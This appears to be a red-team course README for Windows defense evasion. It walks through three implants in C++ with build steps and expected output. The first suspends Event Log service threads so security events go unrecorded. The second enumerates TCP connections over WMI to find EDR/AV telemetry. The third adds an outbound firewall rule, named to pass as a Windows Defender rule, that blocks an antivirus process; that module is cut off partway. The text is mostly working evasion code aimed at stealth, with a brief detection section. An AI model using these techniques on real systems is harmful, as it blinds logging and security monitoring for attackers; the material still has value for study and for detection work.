## Usage Guide for High-privileged user vector (Local-admin)

<details>
<summary>01 - Blinding Eventlog 2</summary>

[03.Local-admin/01.BlindingEventlog](https://github.com/Excalibra/RED-TEAM-OPERATOR-Evasion-Windows/tree/main/Files%20Windows%20Evasion/03.Local-admin/01.BlindingEventlog)

## Overview

Event Log blinding is a technique that suspends Windows Event Log service threads to prevent security events from being recorded while maintaining the appearance of a normally running service. This method was reportedly used by advanced threat actors to avoid detection during operations.

## Technical Implementation

### Step 1: Understanding the Technique

The technique works by:
1. **Identifying Event Log Service Process**: Locating the specific svchost.exe instance hosting the EventLog service
      <img width="1332" height="816" alt="image" src="https://github.com/user-attachments/assets/a7eb7ce7-d09a-4a8c-b037-977a843e9b13" />
   <img width="1331" height="818" alt="image" src="https://github.com/user-attachments/assets/f378af26-38b5-4d4b-a2d9-3f70a14200fe" />

2. **Thread Identification**: Finding only the threads specifically responsible for event logging
   <img width="1332" height="816" alt="image" src="https://github.com/user-attachments/assets/435d6e4b-d14b-434c-90c7-cd3b9a6ef2fa" />
   <img width="1328" height="815" alt="image" src="https://github.com/user-attachments/assets/ca527107-86ad-4ef1-8340-2030bfe6b7b9" />
   
3. **Selective Suspension**: Suspending only event log-related threads while leaving other service threads running
4. **Stealth Maintenance**: Keeping the service apparently running to avoid detection

### Step 2: Practical Demonstration

#### Setting Up Event Monitoring

**Open Event Viewer and Create Custom View:**
1. Launch Event Viewer (`eventvwr.msc`)
2. Create a new Custom View
   <img width="1333" height="728" alt="image" src="https://github.com/user-attachments/assets/5067ead4-6753-4164-897c-b510a83487b3" />
   
3. Include all Windows logs and all Event IDs
   <img width="1241" height="790" alt="image" src="https://github.com/user-attachments/assets/f1969385-849a-41eb-8982-a0208718464a" />
   
4. Name it "All Windows Logs" for monitoring
<img width="783" height="513" alt="image" src="https://github.com/user-attachments/assets/50f4ced8-ebf0-47c7-a398-02442a562e3b" />
   
   <img width="1463" height="708" alt="image" src="https://github.com/user-attachments/assets/1427c67c-d90d-4657-9532-989598490b5e" />

**Generate Test Events Before Suspension:**
- Open Local Security Policy (`secpol.msc`)
- Navigate to **Local Policies** → **Audit Policy**
- Click on **Audit system events**
  <img width="1249" height="733" alt="image" src="https://github.com/user-attachments/assets/777b58e5-0d9f-4ef6-aa5d-8fc51e5e30be" />

- Check the **Success** checkbox and click **OK**
  <img width="1029" height="738" alt="image" src="https://github.com/user-attachments/assets/e9b5d802-0bda-4e27-a0ad-adcd6777a5cd" />

- This generates audit policy change events (Event ID 4719)
- Observe new events appearing in the custom view

#### Manual Thread Suspension Test

**Using Process Explorer:**
1. Locate the Event Log service process (svchost.exe hosting EventLog)
2. Open the Threads tab
3. Manually suspend all Event Log-related threads
   <img width="1569" height="698" alt="image" src="https://github.com/user-attachments/assets/75929937-7cbf-495b-b6e1-a481176a0584" />
4. Make additional policy changes to test logging
5. **Observation**: No new events appear in Event Viewer
6. Resume threads to see queued events flood in
   <img width="1230" height="778" alt="image" src="https://github.com/user-attachments/assets/234ca30b-9767-4b49-b919-4534d44c11d6" />
   <img width="1511" height="717" alt="image" src="https://github.com/user-attachments/assets/dd4aa807-6949-4eda-b00c-5ec9f7c83e6c" />


### Step 3: Code Implementation

#### Compile and Run the Demonstration

Open **Developer Command Prompt for VS** with Administrator privileges:

```batch
cd 01.BlindingEventlog
compile.bat
implant.exe
```

#### Code Walkthrough

**Step 3.1: Privilege Escalation**

```cpp
// Enable SE_DEBUG_NAME privilege required for process manipulation
if (!SetPrivilege(SE_DEBUG_NAME, ENABLE)) {
    printf("Boooo! No powers, we die!\n");
    return -1;
}
```

**Why Admin Privileges Are Required:**
- Manipulating system services requires elevated privileges
- `SE_DEBUG_NAME` privilege allows process and thread manipulation
- Without this privilege, the technique will fail

**Step 3.2: Locating Event Log Service Process**

```cpp
// Talk to Service Manager to find Eventlog process
SC_HANDLE sc = OpenSCManagerA(".", NULL, MAXIMUM_ALLOWED);
SC_HANDLE svc = OpenServiceA(sc, "EventLog", MAXIMUM_ALLOWED);

// Get PID of svchost.exe that hosts EventLog service
QueryServiceStatusEx(svc, SC_STATUS_PROCESS_INFO, (LPBYTE) &svcStatus, 
                    sizeof(svcStatus), &bytesNeeded);
DWORD svcPID = svcStatus.dwProcessId;

printf("svchost with eventlog - PID: %d\n", svcPID);
```

**Service Manager Interaction:**
- `OpenSCManagerA` connects to the Service Control Manager
- `OpenServiceA` opens the EventLog service specifically
- `QueryServiceStatusEx` retrieves the hosting process ID

**Step 3.3: Thread Enumeration and Identification**

```cpp
// Get snapshot of all threads in the system
hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
te32.dwSize = sizeof(THREADENTRY32);

// Parse the snapshot and search for threads belonging to eventlog
do {
    if (te32.th32OwnerProcessID == svcPID) {
        // Found thread from EventLog-hosting svchost
        // Thread identification logic continues...
    }
} while (Thread32Next(hThreadSnap, &te32));
```

**Thread Snapshot Process:**
- `CreateToolhelp32Snapshot` captures all running threads
- `Thread32First` and `Thread32Next` iterate through the thread list
- Filter threads by owner process ID to find only EventLog service threads

**Step 3.4: Service Tag Identification**

```cpp
// Get function pointers for internal APIs
NtQueryInformationThread_t pNtQueryInformationThread = 
    (NtQueryInformationThread_t) GetProcAddress(GetModuleHandle("ntdll.dll"), 
    "NtQueryInformationThread");
I_QueryTagInformation_t pI_QueryTagInformation = 
    (I_QueryTagInformation_t) GetProcAddress(GetModuleHandle("advapi32.dll"), 
    "I_QueryTagInformation");

// Query thread basic information to get TEB address
NTSTATUS status = pNtQueryInformationThread(hThread, 
    (THREAD_INFORMATION_CLASS) 0, &threadBasicInfo, 
    sizeof(threadBasicInfo), NULL);
```

**Internal API Usage:**
- `NtQueryInformationThread` retrieves Thread Environment Block (TEB) address
- `I_QueryTagInformation` translates service tags to service names
- These are undocumented but stable Windows APIs

**Step 3.5: Architecture-Specific Offset Calculation**

```cpp
// Check if svchost.exe is 32- or 64-bit, offset in TEB is different for each arch
bIsWoW64 = IsWow64Process(hSvcProc, &bIsWoW64);
if (!bIsWoW64)
    dwOffset = 0x1720;  // 64-bit offset
else
    dwOffset = 0xf60;   // 32-bit offset

// Read subProcessTag value from TEB of svchost.exe
ReadProcessMemory(hSvcProc, 
    ((PBYTE)threadBasicInfo.pTebBaseAddress + dwOffset), 
    &subProcessTag, sizeof(subProcessTag), NULL);
```

**TEB Structure Differences:**
- 64-bit Windows: SubProcessTag at offset 0x1720 in TEB
- 32-bit Windows: SubProcessTag at offset 0xf60 in TEB
- `IsWow64Process` detects the process architecture

**Step 3.6: Service Name Verification and Thread Suspension**

```cpp
SC_SERVICE_TAG_QUERY query = { 0 };
query.processId = (ULONG) svcPID;
query.serviceTag = (ULONG) subProcessTag;
query.reserved = 0;
query.pBuffer = NULL;

pI_QueryTagInformation(NULL, ServiceNameFromTagInformation, &query);

if (_wcsicmp((wchar_t *) query.pBuffer, L"eventlog") == 0) {
    printf("[!] Eventlog thread FOUND: %d. Suspending...", te32.th32ThreadID);
    if (SuspendThread(hThread) != -1)
        printf("done!\n");
    else
        printf("failed!\n");
}
```

**Service Tag Verification:**
- `I_QueryTagInformation` converts the numeric tag to service name
- Compare with "eventlog" to identify Event Log-specific threads
- Only suspend threads confirmed to belong to Event Log service

## Practical Demonstration

### Step 4: Running the Implant

**Execute with Administrator Privileges:**
```batch
implant.exe
```

**Expected Output:**
```
svchost with eventlog - PID: 1234
[!] Eventlog thread FOUND: 1192. Suspending...done!
[!] Eventlog thread FOUND: 1220. Suspending...done!
[!] Eventlog thread FOUND: 1224. Suspending...done!
[!] Eventlog thread FOUND: 1228. Suspending...done!
[!] Eventlog thread FOUND: 1232. Suspending...done!
```

<img width="1284" height="674" alt="image" src="https://github.com/user-attachments/assets/126779cb-db49-442b-a23a-e9b59281c7d3" />


### Step 5: Testing Event Log Blinding

**Generate Test Events After Suspension:**

1. **Open Local Security Policy:**
   ```batch
   secpol.msc
   ```

2. **Navigate to Audit Policies:**
   - Go to **Local Policies** → **Audit Policy**
   - Select **Audit system events**
   - Check **Success** checkbox
   - Click **OK** to apply changes

3. **Check Event Viewer:**
   - Refresh the "All Windows Logs" custom view
   - **Expected Result**: No new Event ID 4719 (audit policy change) events appear
   - Events are generated but not written to disk due to suspended threads

4. **Verify with Other Event Sources:**
   - Try other system changes that normally generate events
   - No new events should appear in any Windows logs
   - The Event Log service appears running but logging is disabled

**Thread Status Verification:**
- Open Process Explorer as Administrator
- Locate the EventLog-hosting svchost.exe process
- Check Threads tab - suspended threads show suspended state
- Compare thread IDs with implant output

### Step 6: Important Considerations

**Event Buffering Behavior:**
- Events continue to be generated and buffered in memory
- If threads are resumed, buffered events will be written to disk
- System reboot clears the event buffers permanently
- Events generated during suspension are lost after reboot

**Stealth Advantages:**
- Service continues to show "Running" status in Services.msc
- No service crash or abnormal termination
- Only specific logging threads are suspended
- Other service functionality remains intact
- Normal system operation continues uninterrupted

## Technical Deep Dive

### Step 7: Understanding Service Host Architecture

**Windows Service Host Model:**
```
svchost.exe (PID: 1234) - Service Host Process
├── Thread 1192 (EventLog service - SUSPENDED)
├── Thread 1220 (EventLog service - SUSPENDED) 
├── Thread 1224 (EventLog service - SUSPENDED)
├── Thread 1228 (EventLog service - SUSPENDED)
├── Thread 1232 (EventLog service - SUSPENDED)
└── Thread 1300 (Other service - RUNNING)
```

**Why Selective Thread Targeting:**
- Multiple services can run in single svchost.exe process
- Suspending all threads would affect other services
- Service tags identify threads belonging to specific services
- Maintains stealth by only affecting Event Log functionality

### Step 8: Event Generation Test Details

**Audit Policy Change Events:**
- **Event ID**: 4719
- **Source**: Microsoft-Windows-Security-Auditing
- **Description**: System audit policy was changed
- **Trigger**: Changing any audit policy setting
- **Reliability**: Consistently generated on policy changes

**Other Test Events:**
- User logon/logoff events
- Process creation events
- File access audit events
- Registry modification events

## Detection and Mitigation

### Detection Opportunities

**Behavioral Indicators:**
- Multiple thread suspensions in service host processes
- `SuspendThread` API calls targeting system service threads
- Event log gaps during periods of system activity
- Mismatch between service status and functionality

**Forensic Artifacts:**
- Suspended thread state in memory dumps
- `I_QueryTagInformation` API calls in call stacks
- Service tag query patterns in advanced EDR solutions

### Defensive Strategies

**Service Monitoring:**
```cpp
// EDRs can monitor for service thread manipulation
BOOL MonitorServiceThreads(DWORD servicePid) {
    // Track thread state changes in critical services
    // Alert on multiple thread suspensions in short timeframes
    // Monitor for service tag query patterns
    return IsSuspiciousThreadActivity(servicePid);
}
```

**Event Log Integrity Checking:**
- Monitor for event log gaps and inconsistencies
- Alert on extended periods without expected event types
- Implement heartbeat events to detect logging failures

## Building the Project

### Prerequisites
- Visual Studio 2019 or later
- Windows SDK
- Administrator privileges for testing

### Compilation
```batch
cd 01.BlindingEventlog
compile.bat
```

### Required Libraries and Headers
```cpp
#include <windows.h>
#include <Strsafe.h>
#include <tlhelp32.h>

#pragma comment(lib,"Advapi32.lib")
#pragma comment(lib,"shell32.lib")
```

## Legal and Ethical Considerations

This technique demonstrates:
- **Windows internal service architecture** for educational purposes
- **Advanced thread manipulation** techniques
- **Defensive security research** for understanding advanced attacks

**Important**: This technique manipulates critical system services and should only be used in controlled environments with proper authorization.

## References

- Windows Internals, 7th Edition - Service Architecture
- MITRE ATT&CK: T1562.002 (Impair Defenses: Disable Windows Event Logging)
- Advanced threat actor techniques research
- Windows Service Control Manager Documentation

## Contributing

Contributions welcome for:
- Additional service blinding techniques
- Enhanced detection methods
- Cross-version Windows compatibility
- Error handling improvements

## License

Educational and research purposes only. See LICENSE for details.
  
</details>





<details>
<summary>02 - Blocking EPP Comms-Listing Connections</summary>

[03.Local-admin/02.EPP-comms/01.netprint](https://github.com/Excalibra/RED-TEAM-OPERATOR-Evasion-Windows/tree/main/Files%20Windows%20Evasion/03.Local-admin/02.EPP-comms/01.netprint)

## Overview

This module demonstrates programmatic enumeration of TCP network connections using Windows Management Instrumentation (WMI) to identify security agent communications without relying on detectable command-line tools. This is the foundational step for disrupting EDR/AV telemetry communications.

## Technical Implementation

### Step 1: Understanding the Operational Need

**Attack Scenario:**
- An attacker lands on a machine with EDR/AV agents
- These agents send telemetry and logs to central repositories
- The attacker wants to identify and potentially disrupt these communications
- GUI tools like Process Hacker are not available during engagements
- Command-line tools like `netstat` are heavily monitored

**Target Communications:**
- EDR agents communicating with cloud providers
- AV solutions checking for updates
- Sysmon sending event logs to collectors
- Any outbound security-related communications

### Step 2: Traditional Connection Enumeration Methods

#### Using Command-Line Tools

**Netstat Approach:**
```batch
netstat -ano

#or
netstat -ano | findstr ESTABLISHED

#also by PID
```

<img width="1233" height="809" alt="image" src="https://github.com/user-attachments/assets/c8a8ae8a-2010-434e-8783-593154fba1f5" />

<img width="1135" height="671" alt="image" src="https://github.com/user-attachments/assets/db172bf7-a0a0-4547-8c1d-a7fdd6153936" />


**WMI Command-Line Approach:**
```batch
wmic /namespace:\\root\Standardcimv2 path msft_nettcpconnection get LocalAddress,localport,remoteaddress,remoteport,owningprocess
```
<img width="1286" height="669" alt="image" src="https://github.com/user-attachments/assets/f7b05921-348d-4376-9109-08e576b0d038" />

<img width="1269" height="433" alt="image" src="https://github.com/user-attachments/assets/5ce939af-d5ae-44f7-bf41-8804846ae174" />

**Problems with Command-Line:**
- Easily detectable by security monitoring
- Creates clear audit trails
- Limited filtering capabilities
- Inconsistent output formatting

### Step 3: Programmatic WMI Implementation

#### Compile and Run the Demonstration

Open **Developer Command Prompt for VS**:

```batch
cd 02.BlockingEPPComms
compile.bat
implant.exe
```

#### Code Walkthrough

**Step 3.1: COM Library Initialization**

```cpp
// Initialize COM library with multithreaded apartment
HRESULT hres = CoInitializeEx(0, COINIT_MULTITHREADED); 
if (FAILED(hres)) {
    printf("Failed to initialize COM library. Error code = 0x%x\n", hres);
    return 1;
}

// Set COM security levels
hres = CoInitializeSecurity(
    NULL, 
    -1,                          // COM negotiates service
    NULL,                        // Authentication services
    NULL,                        // Reserved
    RPC_C_AUTHN_LEVEL_DEFAULT,   // Default authentication 
    RPC_C_IMP_LEVEL_IMPERSONATE, // Default Impersonation
    NULL,                        // Authentication info
    EOAC_NONE,                   // Additional capabilities 
    NULL                         // Reserved
);
```

**COM Security Requirements:**
- `COINIT_MULTITHREADED` allows concurrent WMI operations
- `RPC_C_IMP_LEVEL_IMPERSONATE` enables service impersonation
- Required for WMI to access network connection information

**Step 3.2: WMI Locator Creation**

```cpp
// Get the initial locator to WMI
IWbemLocator *pLoc = NULL;
hres = CoCreateInstance(
    CLSID_WbemLocator,           // WMI locator class ID
    0, 
    CLSCTX_INPROC_SERVER,        // Run in same process
    IID_IWbemLocator,            // Interface identifier
    (LPVOID *) &pLoc             // Output pointer
);
```

**WMI Locator Purpose:**
- Factory object for WMI namespace connections
- Provides `ConnectServer` method for namespace access
- Required gateway for all WMI operations

**Step 3.3: Namespace Connection**

```cpp
// Connect to the local root\standardcimv2 namespace
IWbemServices *pSvc = NULL;
hres = pLoc->ConnectServer(
    _bstr_t(L"ROOT\\StandardCIMV2"),  // Target namespace
    NULL,                             // User name
    NULL,                             // Password  
    0,                                // Locale
    NULL,                             // Security flags
    0,                                // Authority
    0,                                // Context object
    &pSvc                             // Service pointer
);

printf("Connected to ROOT\\StandardCIMV2 namespace\n");
```

**Namespace Selection:**
- `ROOT\\StandardCIMV2` contains networking classes
- Alternative to `ROOT\\CIMV2` used in previous modules
- Contains `MSFT_NetTCPConnection` class for TCP connections

**Step 3.4: Proxy Security Configuration**

```cpp
// Set security levels for the proxy
hres = CoSetProxyBlanket(
    pSvc,                        // The proxy to secure
    RPC_C_AUTHN_WINNT,           // Windows NTLM authentication
    RPC_C_AUTHZ_NONE,            // No authorization
    NULL,                        // Server principal name
    RPC_C_AUTHN_LEVEL_CALL,      // Authenticate at call level
    RPC_C_IMP_LEVEL_IMPERSONATE, // Impersonation level
    NULL,                        // Client identity
    EOAC_NONE                    // No additional capabilities
);
```

**Proxy Security Importance:**
- Required for method execution on remote interfaces
- Ensures proper authentication context
- Without this, WMI operations may fail

**Step 3.5: Class Enumeration Setup**

```cpp
// Class to target: MSFT_NetTCPConnection
BSTR ClassName = SysAllocString(L"MSFT_NetTCPConnection");

// Create an Enumerator object for instances of MSFT_NetTCPConnection
IEnumWbemClassObject *pEnumerator = NULL;

hres = pSvc->CreateInstanceEnum(
    ClassName,
    WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, 
    NULL,
    &pEnumerator
);
```

**Enumerator Creation:**
- `CreateInstanceEnum` gets all instances of the specified class
- `WBEM_FLAG_FORWARD_ONLY` enables efficient forward-only enumeration
- `WBEM_FLAG_RETURN_IMMEDIATELY` returns control immediately

**Step 3.6: Connection Enumeration Loop**

```cpp
// List the connections
while (pEnumerator) {
    hres = pEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn);

    if(uReturn == 0)
        break;

    // Data we want to extract
    VARIANT vtPropOwningProc;
    VARIANT vtPropLocAddr;
    VARIANT vtPropLocPort;
    VARIANT vtPropRemAddr;
    VARIANT vtPropRemPort;

    // Get the network-related values from the object
    hres = pclsObj->Get(L"OwningProcess", 0, &vtPropOwningProc, 0, 0);
    hres = pclsObj->Get(L"LocalAddress", 0, &vtPropLocAddr, 0, 0);
    hres = pclsObj->Get(L"LocalPort", 0, &vtPropLocPort, 0, 0);
    hres = pclsObj->Get(L"RemoteAddress", 0, &vtPropRemAddr, 0, 0);
    hres = pclsObj->Get(L"RemotePort", 0, &vtPropRemPort, 0, 0);
    
    // Format and display the connection information
    printf("|%6d | ", vtPropOwningProc.ulVal);
    printf("%15S | ", vtPropLocAddr.bstrVal);
    printf("%9d | ", vtPropLocPort.uintVal);
    printf("%15S | ", vtPropRemAddr.bstrVal);
    printf("%10d |\n", vtPropRemPort.uintVal);

    // Clean up
    VariantClear(&vtPropOwningProc);
    VariantClear(&vtPropLocAddr);
    VariantClear(&vtPropLocPort);
    VariantClear(&vtPropRemAddr);
    VariantClear(&vtPropRemPort);
    pclsObj->Release();
}
```

**VARIANT Structure Usage:**
- `VARIANT` is a generic data type for COM properties
- Different fields used based on data type (`ulVal`, `bstrVal`, `uintVal`)
- Must be cleared with `VariantClear` after use

**Step 3.7: Output Formatting**

```cpp
printf("+=======+=================+===========+=================+============+\n");
printf("|  PID  |  LocalAddress   | LocalPort |  RemoteAddress  | RemotePort |\n");
printf("+-------+-----------------+-----------+-----------------+------------+\n");
// ... connection data printing ...
printf("+=======+=================+===========+=================+============+\n");
```

**Table Format Benefits:**
- Easy to read and parse
- Consistent column alignment
- Professional appearance
- Easy to identify security agent connections

## Practical Demonstration

### Step 4: Running the Implant

**Execute the Program:**
```batch
implant.exe
```

**Expected Output:**
```
Connected to ROOT\StandardCIMV2 namespace
+=======+=================+===========+=================+============+
|  PID  |  LocalAddress   | LocalPort |  RemoteAddress  | RemotePort |
+-------+-----------------+-----------+-----------------+------------+
|  2484 |    192.168.1.45 |     49234 |    52.85.124.84 |        443 |
|   864 |    192.168.1.45 |     49235 |   151.101.1.140 |        443 |
|  1332 |    192.168.1.45 |     49236 |    34.120.177.6 |        443 |
+=======+=================+===========+=================+============+
```

<img width="1684" height="820" alt="image" src="https://github.com/user-attachments/assets/544ab8e0-34f9-4eb6-a0b0-5f472e505515" />

### Step 5: Identifying Security Agent Connections

**Analysis Process:**
1. **Process ID Correlation**: Cross-reference PIDs with running processes
2. **Destination Analysis**: Identify cloud security provider IP ranges
3. **Port Analysis**: Look for HTTPS (443) connections to suspicious destinations
4. **Volume Assessment**: Identify processes with multiple outbound connections

**Common Security Agent Indicators:**
- Connections to known EDR/AV provider IP ranges
- Multiple simultaneous connections from same PID
- Regular heartbeat connections to cloud endpoints
- HTTPS traffic to security-related domains

### Step 6: Comparison with Traditional Methods

**Command-Line Netstat Output:**
```
TCP    192.168.1.45:49234   52.85.124.84:443    ESTABLISHED     2484
TCP    192.168.1.45:49235   151.101.1.140:443   ESTABLISHED     864
```

**WMI Command-Line Output:**
```
LocalAddress  LocalPort  RemoteAddress  RemotePort  OwningProcess
192.168.1.45  49234      52.85.124.84   443         2484
192.168.1.45  49235      151.101.1.140  443         864
```

**Programmatic Advantages:**
- No command-line execution detectable by EDR
- Custom filtering and processing capabilities
- Integration with other attack components
- Stealthier operation

## Technical Deep Dive

### Step 7: WMI Class Structure

**MSFT_NetTCPConnection Properties:**
```cpp
class MSFT_NetTCPConnection {
    [key] string LocalAddress;    // Local IP address
    [key] uint16 LocalPort;       // Local port number
    string RemoteAddress;         // Remote IP address  
    uint16 RemotePort;            // Remote port number
    uint32 OwningProcess;         // Process ID of connection owner
    uint32 State;                 // Connection state (ESTABLISHED, etc.)
    // ... other properties ...
}
```

**Additional Useful Properties:**
- `CreationClassName` - Class name identifier
- `Caption` - Text description
- `Description` - Additional information
- `InstallDate` - When the connection was established

### Step 8: Enhanced Enumeration Features

**Filtering for Specific Processes:**
```cpp
// Add process ID filtering
if (vtPropOwningProc.ulVal == targetPID) {
    // Only process connections from specific PID
    printf("|%6d | ", vtPropOwningProc.ulVal);
    // ... rest of printing logic ...
}
```

**State-Based Filtering:**
```cpp
// Get connection state
VARIANT vtPropState;
hres = pclsObj->Get(L"State", 0, &vtPropState, 0, 0);

// Only show ESTABLISHED connections (state = 5)
if (vtPropState.uintVal == 5) {
    // Process established connections only
}
```

**Remote Address Analysis:**
```cpp
// Analyze remote addresses for security providers
if (IsSecurityProviderIP(vtPropRemAddr.bstrVal)) {
    printf("[SECURITY AGENT] ");
    // Highlight security-related connections
}
```

## Building the Project

### Prerequisites
- Visual Studio 2019 or later
- Windows SDK
- WMI headers and libraries

### Compilation
```batch
cd 02.BlockingEPPComms
compile.bat
```

### Required Libraries and Headers
```cpp
#define _WIN32_DCOM  // Required for DCOM functionality
#include <comdef.h>
#include <Wbemidl.h>

#pragma comment(lib, "wbemuuid.lib")  // WMI UUID library
```

## Next Steps: Connection Blocking

This module establishes the foundation for identifying security agent communications. The next logical step involves:

1. **Process Termination**: Killing security agent processes
2. **Connection Termination**: Closing specific network connections
3. **Firewall Rules**: Blocking outbound communications
4. **Network Filtering**: Using Windows Filtering Platform

**Privilege Requirements:**
- Local administrator privileges for most blocking techniques
- SYSTEM privileges for some advanced network manipulation
- Proper planning to avoid detection during blocking operations

## References

- Microsoft Docs: MSFT_NetTCPConnection Class
- Windows Internals, 7th Edition - Networking Components
- MITRE ATT&CK: T1049 (System Network Connections Discovery)
- WMI Network Classes Documentation


</details>




<details>
<summary>03 - Blocking EPP Comms-Firewall</summary>

[03.Local-admin/02.EPP-comms/02.netblk-fw](https://github.com/Excalibra/RED-TEAM-OPERATOR-Evasion-Windows/tree/main/Files%20Windows%20Evasion/03.Local-admin/02.EPP-comms/02.netblk-fw)

## Overview

This module demonstrates programmatic manipulation of Windows Firewall rules to block Endpoint Protection Platform (EPP) communications, effectively disrupting telemetry and update channels for security agents like antivirus, EDR, and Sysmon.

## Technical Implementation

### Step 1: Understanding Windows Firewall Architecture

**Windows Firewall Profiles:**
- **Domain Profile**: Applied when connected to corporate domain
- **Private Profile**: Applied on trusted private networks  
- **Public Profile**: Applied on untrusted public networks
- **Target**: Outbound rules to block EPP agent communications

**Firewall Rule Components:**
- Application path targeting
- Remote IP address blocking
- Protocol and port restrictions
- Rule naming and grouping for stealth

### Step 2: Manual Firewall Configuration

**Accessing Windows Firewall Settings:**
1. Open Windows Defender Firewall
2. Navigate to **Advanced Settings**
3. Select **Outbound Rules**
4. Observe existing rules and their configurations
   
   <img width="1292" height="878" alt="image" src="https://github.com/user-attachments/assets/520877d1-1ed3-4a0d-9541-5802e141413c" />

**Rule Creation Process:**
- Create rules targeting specific security agent processes
- Apply to all firewall profiles (Domain, Private, Public)
- Use legitimate-sounding names and descriptions for stealth
- Block outbound communications selectively

### Step 3: Code Implementation

#### Compile and Run the Demonstration

Open **Developer Command Prompt for VS** with Administrator privileges:

```batch
cd 02.netblk-fw
compile.bat
implant.exe
```

#### Code Walkthrough

**Step 3.1: COM Library Initialization**

```cpp
// Initialize COM library with apartment threading
HRESULT hrComInit = CoInitializeEx(
    0,
    COINIT_APARTMENTTHREADED  // Required for firewall COM
);

if (FAILED(hrComInit)) {
    printf("CoInitializeEx failed: 0x%08lx\n", hrComInit);
    goto Cleanup;        
}
```

**Threading Model:**
- `COINIT_APARTMENTTHREADED` required for firewall COM objects
- Different from previous modules using `COINIT_MULTITHREADED`
- Essential for proper firewall COM object operation

**Step 3.2: Firewall Policy Object Creation**

```cpp
// Load NetFwPolicy2 COM object
INetFwPolicy2 *pNetFwPolicy2 = NULL;	
hr = CoCreateInstance(
    __uuidof(NetFwPolicy2),      // Firewall policy class ID
    NULL, 
    CLSCTX_INPROC_SERVER, 
    __uuidof(INetFwPolicy2),     // Interface ID
    (LPVOID *) &pNetFwPolicy2
);

if (FAILED(hr)) {
    printf("CoCreateInstance for INetFwPolicy2 failed: 0x%08lx\n", hr);
    goto Cleanup;        
}
```

**Firewall COM Components:**
- `NetFwPolicy2` - Main firewall policy management interface
- Provides access to firewall rules collection
- Requires administrator privileges for modification

**Step 3.3: Accessing Firewall Rules Collection**

```cpp
// Retrieve FW rules collection
INetFwRules *pFwRules = NULL;
hr = pNetFwPolicy2->get_Rules(&pFwRules);
if (FAILED(hr)) {
    printf("get_Rules failed: 0x%08lx\n", hr);
    goto Cleanup;
}
```

**Rules Collection:**
- `INetFwRules` interface manages all firewall rules
- Provides `Add`, `Remove`, and `Item` methods
- Contains both inbound and outbound rules

**Step 3.4: Creating New Firewall Rule Object**

```cpp
// Create a new Firewall Rule object
INetFwRule *pFwRule = NULL;
hr = CoCreateInstance(
    __uuidof(NetFwRule),         // Firewall rule class ID
    NULL,
    CLSCTX_INPROC_SERVER,
    __uuidof(INetFwRule),        // Rule interface ID
    (void**)&pFwRule
);

if (FAILED(hr)) {
    printf("CoCreateInstance for Firewall Rule failed: 0x%08lx\n", hr);
    goto Cleanup;
}
```

**Rule Object Creation:**
- `NetFwRule` represents individual firewall rules
- Configurable with various properties and conditions
- Must be fully configured before adding to rules collection

**Step 3.5: Configuring Rule Properties**

```cpp
// New FW rule settings with legitimate-looking names
BSTR bstrRuleName = SysAllocString(L"Windows Defender Firewall Remote Management (RPC)");
BSTR bstrRuleGroup = SysAllocString(L"Windows Defender Firewall Remote Management (RPC)");
BSTR bstrRuleDescription = SysAllocString(L"Deny malicious outbound network traffic");
BSTR bstrRuleApplication = SysAllocString(L"C:\\Program Files\\Bitdefender Antivirus Free\\vsserv.exe");
BSTR bstrRuleRAddrs = SysAllocString(L"54.0.0.0/8");

// Apply to all firewall profiles
long CurrentProfilesBitMask = NET_FW_PROFILE2_DOMAIN | 
                              NET_FW_PROFILE2_PRIVATE | 
                              NET_FW_PROFILE2_PUBLIC;
```

**Stealth Configuration:**
- Use names that blend with existing Windows rules
- "Windows Defender Firewall Remote Management" appears legitimate
- Descriptions should not raise suspicion
- Grouping helps organize related rules

**Step 3.6: Setting Rule Parameters**

```cpp
// Populate the Firewall Rule object
pFwRule->put_Name(bstrRuleName);
pFwRule->put_Description(bstrRuleDescription);
pFwRule->put_ApplicationName(bstrRuleApplication);
pFwRule->put_Protocol(NET_FW_IP_PROTOCOL_ANY);
// pFwRule->put_RemoteAddresses(bstrRuleRAddrs);  // Optional IP blocking
pFwRule->put_Direction(NET_FW_RULE_DIR_OUT);      // Outbound rule
pFwRule->put_Grouping(bstrRuleGroup);
pFwRule->put_Profiles(CurrentProfilesBitMask);    // All profiles
pFwRule->put_Action(NET_FW_ACTION_BLOCK);         // Block traffic
pFwRule->put_Enabled(VARIANT_TRUE);               // Enable immediately
```

**Key Rule Properties:**
- `ApplicationName`: Target specific executable path
- `Direction`: `NET_FW_RULE_DIR_OUT` for outbound blocking
- `Action`: `NET_FW_ACTION_BLOCK` to prevent communications
- `Profiles`: Apply to all network types
- `Enabled`: `VARIANT_TRUE` to activate immediately

**Step 3.7: Adding Rule to Firewall**

```cpp
// Add the Firewall Rule to the collection
hr = pFwRules->Add(pFwRule);
if (FAILED(hr)) {
    printf("Firewall Rule Add failed: 0x%08lx\n", hr);
    goto Cleanup;
}
```

**Rule Activation:**
- Rules take effect immediately upon addition
- No service restart required
- Existing connections may be terminated
- New connection attempts are blocked

**Step 3.8: Comprehensive Cleanup**

```cpp
Cleanup:
    // Free BSTR strings
    SysFreeString(bstrRuleName);
    SysFreeString(bstrRuleDescription);
    SysFreeString(bstrRuleGroup);
    SysFreeString(bstrRuleApplication);
    SysFreeString(bstrRuleRAddrs);

    // Release COM objects in reverse creation order
    if (pFwRule != NULL) pFwRule->Release();
    if (pFwRules != NULL) pFwRules->Release();
    if (pNetFwPolicy2 != NULL) pNetFwPolicy2->Release();

    // Uninitialize COM
    if (SUCCEEDED(hrComInit)) {
        CoUninitialize();
    }
```

**Proper Resource Management:**
- Always free BSTR strings to prevent memory leaks
- Release COM objects in reverse creation order
- Proper cleanup ensures system stability

## Practical Demonstration

### Step 4: Running the Implant

<img width="1676" height="815" alt="image" src="https://github.com/user-attachments/assets/80824b85-258d-4a5c-b8bd-16a8b2163983" />

**Execute with Administrator Privileges:**
```batch
implant.exe
```
<img width="1678" height="814" alt="image" src="https://github.com/user-attachments/assets/6e0eaea9-72b3-48bb-8ce9-68e09807241c" />

<img width="1678" height="821" alt="image" src="https://github.com/user-attachments/assets/85c5426b-0638-4062-8afc-6d2e31a7a782" />


**Expected Output:**
- No console output on success (silent operation)
- Immediate termination of target process connections
- New firewall rule visible in Windows Firewall

  <img width="1679" height="823" alt="image" src="https://github.com/user-attachments/assets/9171c8eb-7650-44aa-8cf8-ee06ce6b6247" />

### Step 5: Verification and Observation

**Check Firewall Rules:**
1. Open **Windows Defender Firewall with Advanced Security**
